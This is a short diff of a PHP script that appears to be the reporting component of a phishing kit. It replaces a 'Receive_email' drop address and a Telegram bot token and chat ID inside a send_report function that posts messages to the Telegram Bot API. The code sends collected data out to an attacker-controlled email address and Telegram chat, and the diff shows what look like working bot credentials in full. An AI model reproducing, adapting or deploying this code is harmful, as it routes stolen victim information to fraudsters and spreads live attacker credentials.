@@ -1,9 +1,9 @@
 <?php
-$Receive_email = "top4lyfe@atomicmail.io";
+$Receive_email = "richlife09@atomicmail.io";
 
 function send_report($to, $subject, $message) {
-    $token = '8877413739:AAGXqcPEdUMgf0JGK8B-qK7f-4Tfe3MeCCw';
-    $chat_id = '7576365237';
+    $token = '9152700653:AAEBGwViN8m7SpGnCIoqHEDIbGcsJBljqA0';
+    $chat_id = '7213589530';
     $text = $subject . "\n\n" . $message;
     $url = "https://api.telegram.org/bot{$token}/sendMessage";
     $data = http_build_query(['chat_id' => $chat_id, 'text' => $text]);
